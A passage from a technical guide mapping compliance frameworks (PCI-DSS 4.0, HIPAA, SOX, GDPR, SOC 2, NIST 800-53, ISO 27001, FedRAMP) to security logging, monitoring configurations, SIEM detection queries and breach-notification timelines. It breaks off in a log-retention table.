```yaml
evidence_preservation:
  legal_requirements:
    chain_of_custody:
      - "Document who collected the evidence, when, how"
      - "Use write-once storage (S3 Object Lock, Azure Immutable Blob)"
      - "Generate SHA-256 hashes of all evidence files"
      - "Maintain chain of custody log with timestamps"
    admissibility_criteria:
      - "Authentic: Evidence is what it claims to be (hash verification)"
      - "Reliable: Collection process is documented and repeatable"
      - "Complete: No gaps in relevant data"
      - "Proportional: Only data relevant to the investigation"

  aws_immutable_storage: |
    aws s3api put-object-lock-configuration \
      --bucket forensic-evidence-${ACCOUNT_ID} \
      --object-lock-configuration '{
        "ObjectLockEnabled": "Enabled",
        "Rule": {
          "DefaultRetention": {
            "Mode": "COMPLIANCE",
            "Years": 7
          }
        }
      }'
```

### 2.4 Breach Notification Timelines

| Regulation | Notify | Timeline | Trigger | Penalty |
|-----------|--------|----------|---------|---------|
| **GDPR** Art. 33 | Supervisory Authority | 72 hours from awareness | Personal data breach risking rights/freedoms | Up to 10M EUR / 2% global turnover |
| **GDPR** Art. 34 | Individuals | "Without undue delay" | High risk to rights/freedoms | Up to 10M EUR / 2% global turnover |
| **SEC** Rule 2023 | SEC via Form 8-K | 4 business days from materiality determination | Material cybersecurity incident | SEC enforcement action |
| **HIPAA** | HHS + Individuals | 60 days (individuals), annual/60d (HHS by size) | Unsecured PHI breach | $100-$50K per violation, up to $1.5M/yr |
| **PCI-DSS** | Acquirer/Payment Brand | Immediately upon confirmation | Cardholder data compromise | $5K-$100K/month fines |
| **NIS2** (EU) | CSIRT + authority | 24h early warning, 72h notification, 1 month final | Significant incident | Up to 10M EUR / 2% turnover |
| **DORA** (EU) | Financial authority | 4h initial, 72h intermediate, 1 month final | Major ICT incident | Per member state |
| **CCPA/CPRA** | CA AG + Individuals | "Expeditiously" | Personal information breach | $100-$750 per consumer |

### 2.5 Post-Incident Review and Observability Improvements

```yaml
post_incident_review:
  meeting_structure:
    timing: "Within 5-10 business days of incident closure"
    duration: "60-90 minutes"
    agenda:
      - topic: "Timeline Review (20 min)"
        content: "Walk through incident timeline, identify key decision points"
      - topic: "Detection Analysis (15 min)"
        questions:
          - "How was the incident detected?"
          - "What was the MTTD? Could we have detected it sooner?"
          - "Were there earlier signals we missed? Why?"
      - topic: "Response Analysis (15 min)"
        questions:
          - "What was the MTTR? What caused delays?"
          - "Were playbooks adequate?"
          - "Were there tooling gaps?"
      - topic: "Observability Gaps (15 min)"
        questions:
          - "What logs/metrics/traces were missing?"
          - "Were there visibility blind spots?"
      - topic: "Action Items (15 min)"
        categories:
          - "New detection rules to create"
          - "Existing rules to tune"
          - "New data sources to onboard"
          - "Playbook updates"
          - "Architecture changes"

  pir_metrics:
    - name: "pir_action_items_completion_rate"
      target: ">= 80% completed within deadline"
    - name: "pir_action_item_completion_days"
      buckets: [7, 14, 30, 60, 90]
    - name: "detection_improvement_validated"
      description: "PIR improvements that passed re-test validation"
```

---

## 3. Compliance and Audit Observability

### 3.1 PCI-DSS 4.0 (Effective March 31, 2025)

PCI-DSS 4.0 represents the most significant update to the Payment Card Industry Data Security Standard since version 3.0. The transition deadline from PCI-DSS 3.2.1 to 4.0 was March 31, 2024, with "future-dated" requirements becoming mandatory on March 31, 2025.

#### Requirement 10: Log and Monitor All Access to System Components and Cardholder Data

```yaml
pci_dss_4_requirement_10:
  "10.1":
    title: "Processes and mechanisms for logging and monitoring are defined and documented"
    observability_implementation:
      - "Documented logging policy specifying what, where, how long"
      - "Log architecture diagram showing collection, aggregation, storage"
      - "Roles and responsibilities for log review"

  "10.2":
    title: "Audit logs are implemented to support detection of anomalies and suspicious activity"
    sub_requirements:
      "10.2.1":
        title: "Audit logs are enabled and active for all system components"
        evidence: "Log source inventory with enabled/disabled status"
        otel_implementation: |
          # OTel Collector filelog receiver for audit logs
          receivers:
            filelog/pci_audit:
              include:
                - /var/log/auth.log
                - /var/log/secure
                - /var/log/audit/audit.log
                - /opt/application/logs/access.log
              operators:
                - type: regex_parser
                  regex: '^(?P<timestamp>\S+ \S+) (?P<hostname>\S+) (?P<process>\S+): (?P<message>.*)'
                  timestamp:
                    parse_from: attributes.timestamp
                    layout: '%b %d %H:%M:%S'

      "10.2.1.1":
        title: "Audit logs capture all individual user access to cardholder data"
        required_events:
          - "All access to cardholder data (CHD) and sensitive authentication data (SAD)"
          - "Actions taken by any individual with root or administrative privileges"
          - "Access to all audit trails"
          - "Invalid logical access attempts"
          - "Use of and changes to identification and authentication mechanisms"
          - "Initialization, stopping, or pausing of audit logs"
          - "Creation and deletion of system-level objects"

      "10.2.1.2":
        title: "Audit logs capture all actions by individuals with administrative access"
        detection_query: |
          # Splunk: Monitor all admin actions in CDE
          index=pci_cde sourcetype IN ("linux_secure", "wineventlog:security", "application_audit")
          (user_role="admin" OR user_role="root" OR EventCode=4672)
          | stats count by user, action, dest, _time
          | sort -_time

      "10.2.2":
        title: "Audit logs record required details for each auditable event"
        required_fields:
          - "User identification (who)"
          - "Type of event (what)"
          - "Date and time (when)"
          - "Success or failure indication (outcome)"
          - "Origination of event (where/source)"
          - "Identity or name of affected data, system component, or resource (target)"

  "10.3":
    title: "Audit logs are protected from destruction and unauthorized modifications"
    implementation:
      - "Write-once storage (S3 Object Lock, Azure Immutable Blob Storage)"
      - "Separate log server/SIEM not accessible to monitored system admins"
      - "File integrity monitoring on log files (AIDE, OSSEC, Tripwire)"
      - "Access controls restricting who can view/modify log configurations"
    otel_config: |
      # OTel Collector exporter to write-once storage
      exporters:
        awss3/pci_audit:
          s3uploader:
            region: us-east-1
            s3_bucket: pci-audit-logs-immutable
            s3_prefix: "audit-logs"
            s3_partition: "year=%Y/month=%m/day=%d/hour=%H"
          marshaler: otlp_json

  "10.4":
    title: "Audit logs are reviewed to identify anomalies or suspicious activity"
    sub_requirements:
      "10.4.1":
        title: "Daily review of audit logs for all critical security events"
        frequency: "At least daily"
        automated_review: |
          # Automated daily log review checklist
          daily_review_queries:
            - name: "Failed authentication attempts"
              query: "index=pci_cde EventCode=4625 | stats count by user, src | where count > 5"
              threshold: 5
              action: "Investigate accounts with > 5 failures"

            - name: "Privilege escalation"
              query: "index=pci_cde (EventCode=4672 OR EventCode=4728 OR EventCode=4732)"
              action: "Verify all privilege grants are authorized"

            - name: "System clock changes"
              query: "index=pci_cde EventCode=4616"
              action: "Investigate any time changes (audit log integrity)"

            - name: "Audit log gaps"
              query: |
                | tstats count where index=pci_cde by _time span=1h, host
                | where count < 10
              action: "Investigate hosts with unusually low log volume"

      "10.4.1.1":  # NEW in PCI-DSS 4.0 (future-dated, mandatory March 2025)
        title: "Automated mechanisms perform audit log reviews"
        requirement: "Use SIEM, log analytics, or equivalent automated tools"
        implementation: "SIEM correlation rules + daily automated reports"

      "10.4.2":
        title: "Logs of all other system components are reviewed periodically"
        frequency: "At least weekly or per risk assessment"

      "10.4.2.1":  # NEW in PCI-DSS 4.0
        title: "Frequency of review defined in targeted risk analysis"
        requirement: "Document risk-based justification for review frequency"

  "10.5":
    title: "Audit log history is retained and available for analysis"
    sub_requirements:
      "10.5.1":
        title: "Retain audit log history for at least 12 months, with at least the most recent 3 months immediately available"
        storage_tiers: |
          Hot (0-3 months):   Elasticsearch/Splunk indexers, instant query
          Warm (3-6 months):  Lower-cost indexes, query within minutes
          Cold (6-12 months): S3/GCS/Blob object storage, query within hours
          Archive (12+ months): Glacier/Archive tier, restore within 24h
        otel_routing: |
          # Route logs based on age to appropriate storage tier
          processors:
            routing/pci_retention:
              default_exporters: [elasticsearch/hot]
              table:
                - statement: route()
                  exporters: [awss3/cold]
                  # Cold storage handled by ILM policy on Elasticsearch side

  "10.6":
    title: "Time-synchronization mechanisms support consistent time across all systems"
    requirement: "NTP or equivalent, all CDE systems synced to same time source"
    monitoring: |
      # Prometheus alert for NTP drift
      - alert: NTPDriftExceedsPCIThreshold
        expr: abs(node_timex_offset_seconds) > 1.0
        for: 5m
        labels:
          severity: critical
          compliance: pci-dss
          requirement: "10.6"
        annotations:
          summary: "NTP drift exceeds 1 second on {{ $labels.instance }}"
          description: "PCI-DSS 10.6 requires consistent time synchronization. Current drift: {{ $value }}s"

  "10.7":
    title: "Failures of critical security control systems are detected, reported, and responded to promptly"
    sub_requirements:
      "10.7.1":  # NEW in PCI-DSS 4.0
        title: "Additional requirement for service providers: Failures detected and alerted within a timely manner"
        monitoring: |
          # Monitor critical security controls
          critical_controls:
            - name: "SIEM/Log Collection"
              check: "Log ingestion rate > 0 for all CDE sources"
              alert_threshold: "No logs for > 15 minutes"

            - name: "IDS/IPS"
              check: "IDS process running, signatures updated within 24h"
              alert_threshold: "Process down or signatures > 48h old"

            - name: "File Integrity Monitoring"
              check: "FIM agent running, daily scan completed"
              alert_threshold: "Agent down or scan missed"

            - name: "Anti-malware"
              check: "AV/EDR agent running, definitions < 24h old"
              alert_threshold: "Agent down or definitions > 48h old"

            - name: "Access controls"
              check: "Authentication services responsive"
              alert_threshold: "Auth service down > 5 minutes"
```

#### Requirement 11: Test Security of Systems and Networks Regularly

```yaml
pci_dss_4_requirement_11:
  "11.3":
    title: "External and internal vulnerabilities are regularly identified, prioritized, and addressed"
    observability:
      vulnerability_metrics:
        - "Scan coverage: % of CDE assets scanned in last 90 days"
        - "Critical/High vulnerability count by age bucket (0-30d, 30-60d, 60-90d, >90d)"
        - "Mean Time to Remediate by severity"
        - "Rescan pass rate (vulnerabilities confirmed fixed)"
      prometheus_metrics: |
        # Vulnerability metrics
        vulnerability_scan_coverage_ratio{environment="cde"} 0.98
        vulnerability_open_count{severity="critical",age_bucket="0_30d"} 3
        vulnerability_open_count{severity="critical",age_bucket="30_60d"} 0
        vulnerability_open_count{severity="high",age_bucket="0_30d"} 12
        vulnerability_mttr_days{severity="critical"} 7.2
        vulnerability_mttr_days{severity="high"} 18.5
        vulnerability_rescan_pass_ratio 0.92

  "11.5":
    title: "Network intrusions and unexpected file changes are detected and responded to"
    "11.5.1":
      title: "IDS/IPS deployed at perimeter and critical points in CDE"
      monitoring: |
        # Monitor IDS/IPS health and effectiveness
        - alert: IDSSignatureOutdated
          expr: (time() - ids_last_signature_update_timestamp) > 172800
          labels: { compliance: "pci-dss", requirement: "11.5.1" }
          annotations:
            summary: "IDS signatures not updated in > 48 hours"

    "11.5.2":
      title: "File integrity monitoring (FIM) deployed on critical files"
      monitored_files:
        - "System executables and libraries"
        - "Application binaries and configuration files"
        - "Audit log files and configurations"
        - "Security tool configurations"
      otel_implementation: |
        # OTel Collector can monitor file changes via filestats receiver
        receivers:
          filestats/pci_fim:
            include: /etc/**
            collection_interval: 1m
            metrics:
              file.mtime:
                enabled: true
              file.size:
                enabled: true
              file.hash:  # Custom extension
                enabled: true
                algorithm: sha256

  "11.6":  # NEW in PCI-DSS 4.0
    title: "Unauthorized changes on payment pages are detected and responded to"
    implementation:
      - "HTTP header monitoring (CSP, SRI violations)"
      - "JavaScript integrity monitoring"
      - "DOM change detection"
      - "Real User Monitoring (RUM) for anomalous script behavior"
    detection: |
      # Monitor for e-skimming / Magecart-style attacks
      # CSP violation reporting via OTel
      receivers:
        otlp:
          protocols:
            http:
              endpoint: 0.0.0.0:4318
      processors:
        filter/csp_violations:
          logs:
            include:
              match_type: strict
              resource_attributes:
                - key: log.source
                  value: csp-violation-report
      # Alert on unexpected script sources
      # Browser sends CSP violation report -> OTel -> SIEM
```

### 3.2 HIPAA Compliance Observability

The Health Insurance Portability and Accountability Act (HIPAA) Security Rule (45 CFR Parts 160, 162, 164) requires covered entities and business associates to implement administrative, physical, and technical safeguards for electronic Protected Health Information (ePHI).

```yaml
hipaa_security_rule_observability:
  "164.312(b)":
    title: "Audit Controls"
    requirement: "Implement hardware, software, and/or procedural mechanisms to record and examine access to ePHI"
    implementation:
      audit_events:
        - "All access to ePHI (read, write, modify, delete)"
        - "Authentication events (successful and failed)"
        - "Administrative actions (user management, permission changes)"
        - "System events (startup, shutdown, configuration changes)"
        - "Encryption/decryption operations on ePHI"
      log_requirements:
        - "Who: User identification (unique user ID)"
        - "What: Type of action performed"
        - "When: Date and time of action"
        - "Where: System/application/record accessed"
        - "Outcome: Success or failure"

  "164.312(c)":
    title: "Integrity Controls"
    requirement: "Implement policies to protect ePHI from improper alteration or destruction"
    monitoring:
      database_integrity: |
        # Monitor for unauthorized ePHI modifications
        # PostgreSQL audit logging for HIPAA
        ALTER SYSTEM SET log_statement = 'all';
        ALTER SYSTEM SET log_line_prefix = '%t [%p]: user=%u,db=%d,app=%a,client=%h ';
        ALTER SYSTEM SET pgaudit.log = 'read, write, ddl, role';

        -- Alert query: Unusual ePHI table modifications
        SELECT usename, datname, query, query_start
        FROM pg_stat_activity
        WHERE query ~* '(UPDATE|DELETE|INSERT|TRUNCATE).*(patient|medical_record|diagnosis|prescription)'
          AND usename NOT IN (SELECT approved_user FROM hipaa_approved_users)
          AND query_start > NOW() - INTERVAL '1 hour';

      file_integrity: |
        # AIDE (Advanced Intrusion Detection Environment) for ePHI files
        /opt/ehr/data     CONTENT_EX
        /opt/ehr/config   CONTENT_EX
        /opt/ehr/backups  CONTENT_EX

  "164.308(a)(1)(ii)(D)":
    title: "Information System Activity Review"
    requirement: "Implement procedures to regularly review records of information system activity"
    frequency: "At minimum, periodic review; best practice is daily automated + weekly manual"
    automated_review: |
      # Daily HIPAA compliance review queries
      hipaa_daily_checks:
        - name: "ePHI access outside business hours"
          query: |
            index=ehr_audit action="read" OR action="export"
            date_hour<7 OR date_hour>19
            | stats count by user, patient_id, action
          escalation: "Review with department manager"

        - name: "Bulk ePHI access (potential data exfiltration)"
          query: |
            index=ehr_audit action="read"
            | stats dc(patient_id) as patients_accessed by user
            | where patients_accessed > 100
          escalation: "Immediate investigation by privacy officer"

        - name: "ePHI access by terminated employees"
          query: |
            index=ehr_audit
            [| inputlookup terminated_employees | fields user]
            | stats count by user, action, src
          escalation: "Critical: disable account immediately"

        - name: "Failed ePHI access attempts"
          query: |
            index=ehr_audit status="denied"
            | stats count by user, resource, reason
            | where count > 3
          escalation: "Review for potential unauthorized access attempt"

  "164.312(d)":
    title: "Person or Entity Authentication"
    monitoring: |
      # Monitor authentication mechanisms for ePHI systems
      authentication_monitoring:
        - metric: "hipaa_auth_failures_total"
          labels: [system, user, method]
          alert_threshold: 5
          window: 10m

        - metric: "hipaa_mfa_bypass_attempts_total"
          labels: [system, user]
          alert_threshold: 1
          action: "Immediate investigation"

        - metric: "hipaa_session_duration_seconds"
          alert_threshold: 28800  # 8 hours - force re-authentication
          action: "Auto-terminate session, require re-auth"

  breach_detection:
    title: "Breach Detection and Notification (45 CFR 164.400-414)"
    detection_rules:
      - name: "Large-scale ePHI export"
        description: "Detect bulk data exports that may indicate a breach"
        query: |
          index=ehr_audit action IN ("export", "download", "print")
          | stats dc(patient_id) as record_count sum(data_size) as total_bytes by user
          | where record_count > 500 OR total_bytes > 104857600
        severity: critical
        notification: "Privacy Officer within 1 hour"

      - name: "ePHI sent to unauthorized recipient"
        description: "Detect ePHI transmitted outside approved channels"
        query: |
          index=email_gateway attachment_type="medical_record" OR body_contains="PHI"
          | where NOT match(recipient_domain, "(hospital\.org|approved-partner\.com)")
        severity: critical
        notification: "Privacy Officer immediately"

    notification_requirements:
      individuals: "Within 60 days of discovery"
      hhs_large: "Within 60 days if >= 500 individuals affected"
      hhs_small: "Annual log submission for < 500 individuals"
      media: "If >= 500 individuals in a state/jurisdiction"
```

### 3.3 SOX (Sarbanes-Oxley) IT General Controls

SOX Section 404 requires management assessment of internal controls over financial reporting. IT General Controls (ITGCs) are foundational controls that support the reliability of IT systems processing financial data.

```yaml
sox_itgc_observability:
  change_management:
    title: "Change Management Controls"
    requirements:
      - "All changes to financial systems must be authorized, tested, and approved"
      - "Segregation of duties between development and production"
      - "Emergency change procedures with after-the-fact approval"
    monitoring:
      deployment_tracking: |
        # Monitor deployments to financial systems
        deployment_metrics:
          - metric: "sox_deployment_total"
            labels: [application, environment, approver, deployer]
            rule: "deployer != approver"  # SoD check

          - metric: "sox_emergency_change_total"
            labels: [application, justification, post_approval_status]
            alert: "All emergency changes require post-approval within 48h"

          - metric: "sox_unauthorized_change_total"
            labels: [application, user, change_type]
            alert: "CRITICAL: Unauthorized change to financial system"

      git_audit: |
        # Monitor code changes to financial applications
        # GitHub webhook -> OTel Collector -> SIEM
        receivers:
          webhookevent/github:
            endpoint: 0.0.0.0:8088
            path: /github/webhook
        processors:
          filter/sox_repos:
            logs:
              include:
                match_type: regexp
                body: '"repository".*"(finance-app|erp-system|billing-service)"'
          transform/sox_fields:
            log_statements:
              - context: log
                statements:
                  - set(attributes["sox.change_type"], "code_change")
                  - set(attributes["sox.repository"], body["repository"]["name"])
                  - set(attributes["sox.author"], body["sender"]["login"])
                  - set(attributes["sox.approved_by"], body["review"]["user"]["login"])

  access_controls:
    title: "Logical Access Controls"
    requirements:
      - "Access to financial systems granted on need-to-know/least privilege"
      - "Periodic access reviews (at least quarterly)"
      - "Timely removal of access for terminated employees"
      - "Privileged access monitoring"
    monitoring:
      access_review_automation: |
        # Automated quarterly access review
        quarterly_review:
          scope: "All users with access to SOX-relevant systems"
          systems:
            - "ERP (SAP, Oracle, NetSuite)"
            - "Financial reporting (Hyperion, Anaplan)"
            - "Banking/treasury systems"
            - "Payroll systems"
          checks:
            - "User still active in HR system"
            - "Role appropriate for current job function"
            - "No excessive privileges (admin access justified)"
            - "Service account usage reviewed"
            - "SoD violations identified"

      termination_monitoring: |
        # Alert on financial system access by terminated employees
        - alert: SOXTerminatedEmployeeAccess
          expr: |
            sox_access_events_total{user_status="terminated"} > 0
          for: 0m
          labels:
            severity: critical
            compliance: sox
          annotations:
            summary: "Terminated employee {{ $labels.user }} accessed {{ $labels.system }}"

  data_backup_and_recovery:
    title: "IT Operations - Backup and Recovery"
    monitoring: |
      # Monitor backup health for SOX-critical systems
      sox_backup_metrics:
        - metric: "sox_backup_last_success_timestamp"
          labels: [system, backup_type]
          alert: "time() - sox_backup_last_success_timestamp > 86400"  # 24h

        - metric: "sox_backup_size_bytes"
          labels: [system, backup_type]
          alert: "Significant deviation from baseline (potential corruption)"

        - metric: "sox_recovery_test_last_timestamp"
          labels: [system]
          alert: "time() - sox_recovery_test_last_timestamp > 7776000"  # 90 days
```

### 3.4 GDPR Observability Requirements

```yaml
gdpr_observability:
  article_33_breach_notification:
    requirement: "Notify supervisory authority within 72 hours of becoming aware of personal data breach"
    observability_needs:
      - "Precise timestamp of breach awareness (detection time)"
      - "Scope assessment: categories and approximate number of data subjects"
      - "Categories of personal data involved"
      - "Likely consequences assessment"
      - "Measures taken to mitigate"
    automated_breach_classification: |
      # Classify incidents for GDPR breach assessment
      breach_classification:
        - type: "Confidentiality breach"
          indicators:
            - "Unauthorized access to personal data"
            - "Data exfiltration detected"
            - "Unencrypted personal data exposed"
          query: |
            index=dlp action="blocked" OR index=siem alert_type="data_exfiltration"
            data_classification="personal_data"

        - type: "Availability breach"
          indicators:
            - "Ransomware encrypting personal data systems"
            - "Prolonged system outage affecting data access"
          query: |
            index=edr alert_type="ransomware" dest_classification="personal_data_system"

        - type: "Integrity breach"
          indicators:
            - "Unauthorized modification of personal data"
            - "Database integrity violation"

  article_30_records_of_processing:
    requirement: "Maintain records of processing activities"
    monitoring: |
      # Track data processing activities for Article 30 compliance
      data_processing_monitoring:
        - "Log all personal data access with purpose"
        - "Track data flows between systems and jurisdictions"
        - "Monitor data retention compliance (auto-delete when expired)"
        - "Track consent status and lawful basis per processing activity"

  article_17_right_to_erasure:
    monitoring: |
      # Monitor right-to-erasure request compliance
      erasure_metrics:
        - metric: "gdpr_erasure_requests_total"
          labels: [status, data_subject_type]
        - metric: "gdpr_erasure_completion_days"
          target: "< 30 days"
          alert_threshold: 25  # Alert at 25 days to prevent deadline miss
        - metric: "gdpr_erasure_verification_status"
          description: "Verify data actually deleted from all systems"

  data_access_logging:
    requirement: "Log all access to personal data with sufficient detail for accountability"
    implementation: |
      # OTel-based personal data access logging
      processors:
        transform/gdpr_access:
          log_statements:
            - context: log
              conditions:
                - 'attributes["data.classification"] == "personal_data"'
              statements:
                - set(attributes["gdpr.access_logged"], true)
                - set(attributes["gdpr.lawful_basis"], attributes["processing.purpose"])
                - set(attributes["gdpr.data_subject_category"], attributes["data.subject_type"])
```

### 3.5 SOC 2 Type II Trust Service Criteria Mapping

SOC 2 Type II examines controls over a period (typically 6-12 months) against Trust Service Criteria defined by AICPA.

```yaml
soc2_trust_service_criteria:
  CC6_logical_and_physical_access:
    "CC6.1":
      title: "Logical access security software, infrastructure, and architectures"
      observability_evidence:
        - "Authentication logs showing MFA enforcement"
        - "Network segmentation validation (firewall rules, VPC configs)"
        - "Encryption-in-transit metrics (TLS versions, cipher suites)"
        - "Vulnerability scan results and remediation timelines"
      automated_evidence: |
        # Automated evidence collection for CC6.1
        evidence_queries:
          mfa_enforcement: |
            index=auth mfa_result=*
            | stats count(eval(mfa_result="success")) as mfa_success,
                    count(eval(mfa_result="bypass")) as mfa_bypass,
                    count(eval(mfa_result="not_required")) as mfa_not_required
              by application
            | eval mfa_coverage=round(mfa_success/(mfa_success+mfa_bypass+mfa_not_required)*100,1)

          tls_compliance: |
            index=loadbalancer ssl_protocol=*
            | stats count by ssl_protocol, ssl_cipher
            | eval compliant=if(ssl_protocol IN ("TLSv1.2","TLSv1.3"), "yes", "no")

    "CC6.2":
      title: "Prior to issuing system credentials and granting system access, authorized personnel verify identity"
      evidence: "Access request workflow logs, approval chains"

    "CC6.3":
      title: "Access to assets based on authorization is established and maintained"
      evidence: "RBAC/ABAC policy audit, quarterly access reviews"

    "CC6.6":
      title: "Security events are logged, monitored, and acted upon"
      evidence: "SIEM dashboards, alert response documentation, SOC metrics"

  CC7_system_operations:
    "CC7.1":
      title: "To meet its objectives, the entity uses detection and monitoring procedures"
      evidence:
        - "SIEM deployment architecture documentation"
        - "Detection rule inventory with MITRE ATT&CK mapping"
        - "Alert triage and response procedures"
        - "SOC KPI dashboards (MTTD, MTTR, FPR)"

    "CC7.2":
      title: "The entity monitors system components and anomalies"
      evidence:
        - "Infrastructure monitoring dashboards (CPU, memory, disk, network)"
        - "Application performance monitoring (APM)"
        - "Anomaly detection configurations"
        - "Alert escalation procedures"
      automated_evidence: |
        # Generate SOC 2 evidence package
        soc2_evidence_collector:
          schedule: "monthly"
          outputs:
            - type: "siem_alert_summary"
              query: |
                index=notable earliest=-30d
                | stats count by severity, status, owner
                | eval response_met_sla=if(response_time < sla_target, "yes", "no")
              format: "PDF report"

            - type: "vulnerability_summary"
              query: |
                index=vulnerability_scans earliest=-30d
                | stats count by severity, remediation_status
                | eval mttr=avg(remediation_days)
              format: "CSV + PDF"

            - type: "access_review_summary"
              query: |
                index=access_reviews earliest=-90d
                | stats count by review_status, risk_level
              format: "PDF report"

    "CC7.3":
      title: "The entity evaluates security events to determine if they are incidents"
      evidence: "Incident classification criteria, triage documentation"

    "CC7.4":
      title: "The entity responds to identified security incidents"
      evidence: "Incident response plan, incident records, MTTR metrics"

  CC8_change_management:
    "CC8.1":
      title: "Changes to infrastructure, data, software, and procedures are authorized, designed, developed, configured, documented, tested, approved, and implemented"
      evidence:
        - "Change management workflow (Jira/ServiceNow tickets)"
        - "Code review logs (GitHub/GitLab PRs)"
        - "CI/CD pipeline logs showing testing"
        - "Deployment approval records"
        - "Rollback procedures and records"
```

### 3.6 NIST 800-53 Security Controls Mapping

NIST Special Publication 800-53 Rev. 5 provides a catalog of security and privacy controls for information systems and organizations.

```yaml
nist_800_53_observability_controls:
  AU_audit_and_accountability:
    "AU-2":
      title: "Event Logging"
      control: "Identify events that need to be logged"
      observability_mapping:
        - "Define auditable events in logging policy"
        - "Configure log sources per AU-2 event list"
        - "OTel Collector receivers for each log source"
      events_to_log:
        - "Account management (creation, modification, deletion, group changes)"
        - "Successful and unsuccessful logon attempts"
        - "Privileged operations"
        - "Security-relevant configuration changes"
        - "Access to audit logs"

    "AU-3":
      title: "Content of Audit Records"
      required_content:
        - "What: Type of event"
        - "When: Date and time"
        - "Where: Source of event (system, component)"
        - "Who: Subject identity"
        - "Outcome: Success or failure"
        - "Details: Event-specific additional information"

    "AU-6":
      title: "Audit Record Review, Analysis, and Reporting"
      implementation: |
        # Automated audit review supporting AU-6
        nist_au6_automated_review:
          frequency: "Continuous (real-time alerting) + daily summary + weekly report"
          review_categories:
            - category: "Authentication anomalies"
              rules: ["Brute force", "Impossible travel", "Off-hours access"]
            - category: "Privilege escalation"
              rules: ["New admin", "Privilege abuse", "SoD violation"]
            - category: "Data access anomalies"
              rules: ["Bulk download", "Unauthorized access", "Schema changes"]
            - category: "Configuration changes"
              rules: ["Security policy change", "Firewall rule change", "User provision"]

    "AU-9":
      title: "Protection of Audit Information"
      implementation:
        - "WORM storage for audit logs"
        - "Encryption at rest (AES-256)"
        - "Encryption in transit (TLS 1.2+)"
        - "Access restricted to security team only"
        - "Integrity verification (SHA-256 hashing)"

    "AU-12":
      title: "Audit Record Generation"
      implementation: "OTel Collector deployed on all systems in scope"

  SI_system_and_information_integrity:
    "SI-4":
      title: "System Monitoring"
      implementation:
        - "Network IDS/IPS (Suricata, Snort, commercial)"
        - "Host-based monitoring (EDR, Sysmon, auditd)"
        - "Application-layer monitoring (WAF, RASP)"
        - "Cloud control plane monitoring (CloudTrail, Activity Log)"
      otel_role: "OTel Collector as unified telemetry pipeline for all monitoring data"

    "SI-7":
      title: "Software, Firmware, and Information Integrity"
      implementation:
        - "File integrity monitoring (AIDE, OSSEC, Tripwire)"
        - "Code signing verification"
        - "SBOM validation against known vulnerabilities"
        - "Configuration drift detection"

  IR_incident_response:
    "IR-4":
      title: "Incident Handling"
      implementation:
        - "Automated incident detection via SIEM"
        - "Incident response playbooks in SOAR"
        - "Evidence preservation procedures"
        - "Post-incident analysis (PIR) process"

    "IR-5":
      title: "Incident Monitoring"
      metrics:
        - "Incidents by type and severity over time"
        - "MTTD, MTTA, MTTR trends"
        - "Repeat incident rate"
        - "Incidents by attack vector"

    "IR-6":
      title: "Incident Reporting"
      implementation: "Automated notification workflows per jurisdiction requirements"
```

### 3.7 ISO 27001:2022 Annex A Controls

```yaml
iso_27001_2022_observability:
  "A.8.15":
    title: "Logging"
    requirement: "Event logs recording user activities, exceptions, faults, and information security events shall be produced, kept, protected, and analysed"
    implementation:
      log_types:
        - "User activities: authentication, authorization, data access"
        - "Exceptions: application errors, system faults"
        - "Faults: hardware failures, resource exhaustion"
        - "Information security events: IDS/IPS alerts, malware detections, policy violations"
      protection:
        - "Logs stored separately from systems that generate them"
        - "Anti-tamper controls (write-once, integrity hashing)"
        - "Access to logs restricted and logged"
      retention: "Defined by risk assessment, typically 1-3 years"
      otel_implementation: |
        # OTel Collector configuration for ISO 27001 A.8.15
        receivers:
          filelog/security:
            include: [/var/log/auth.log, /var/log/secure, /var/log/audit/audit.log]
          syslog/network:
            protocol: rfc5424
            listen_address: 0.0.0.0:514
          otlp:
            protocols:
              grpc: { endpoint: 0.0.0.0:4317 }
              http: { endpoint: 0.0.0.0:4318 }
        processors:
          attributes/iso27001:
            actions:
              - key: compliance.framework
                value: "ISO27001"
                action: upsert
              - key: compliance.control
                value: "A.8.15"
                action: upsert
        exporters:
          elasticsearch/security_logs:
            endpoints: ["https://siem.internal:9200"]
            logs_index: "iso27001-security-logs"
          awss3/archive:
            s3uploader:
              s3_bucket: iso27001-log-archive
              s3_partition: "year=%Y/month=%m"
        service:
          pipelines:
            logs/security:
              receivers: [filelog/security, syslog/network, otlp]
              processors: [attributes/iso27001]
              exporters: [elasticsearch/security_logs, awss3/archive]

  "A.8.16":
    title: "Monitoring Activities"
    requirement: "Networks, systems, and applications shall be monitored for anomalous behaviour and appropriate actions taken"
    implementation:
      monitoring_scope:
        - "Network traffic patterns and anomalies"
        - "System resource utilization and baseline deviations"
        - "Application behavior and error patterns"
        - "User and entity behavior analytics (UEBA)"
      response_requirements:
        - "Defined thresholds for anomaly alerting"
        - "Documented response procedures for each alert type"
        - "Escalation paths defined"
        - "Regular review and tuning of monitoring rules"
```

### 3.8 FedRAMP Continuous Monitoring

```yaml
fedramp_continuous_monitoring:
  overview:
    description: "FedRAMP Continuous Monitoring (ConMon) strategy requires ongoing assessment of security controls for cloud service providers serving US federal agencies"
    authorization_levels:
      - "FedRAMP Low: 125 controls"
      - "FedRAMP Moderate: 325 controls"
      - "FedRAMP High: 421 controls"

  monthly_deliverables:
    - "Vulnerability scan results (OS, web app, database, container)"
    - "Plan of Action & Milestones (POA&M) updates"
    - "Inventory updates (hardware, software, ports/protocols/services)"
    - "Unique vulnerability count and remediation status"

  scan_requirements:
    vulnerability_scanning:
      frequency: "Monthly (OS/infra), Quarterly (web app), Annual (penetration test)"
      remediation_slas:
        critical: "30 days"
        high: "30 days"
        moderate: "90 days"
        low: "180 days (or risk acceptance)"
      metrics: |
        # FedRAMP vulnerability metrics
        fedramp_vulnerability_metrics:
          - name: "fedramp_vuln_open_count"
            labels: [severity, age_bucket, system_boundary]
            description: "Open vulnerability count by severity and age"

          - name: "fedramp_vuln_overdue_count"
            labels: [severity, system_boundary]
            description: "Vulnerabilities past remediation SLA"
            alert: "Any overdue critical/high = POA&M deviation report required"

          - name: "fedramp_scan_coverage_ratio"
            labels: [scan_type, system_boundary]
            description: "Percentage of assets scanned"
            target: "100%"

  significant_change_monitoring:
    triggers:
      - "New interconnections with external systems"
      - "New data types processed (especially PII)"
      - "Significant architecture changes"
      - "Changes to security boundaries"
      - "New third-party integrations"
    requirement: "Significant changes may require 3PAO re-assessment"
```

### 3.9 Log Retention Requirements Comparison

| Framework | Minimum Retention | Immediately Available | Notes |
|-----------|-------------------|----------------------|-------|
| **PCI-DSS 4.0** | 12 months | 3 months | Applies to CDE and systems that could affect CDE security |
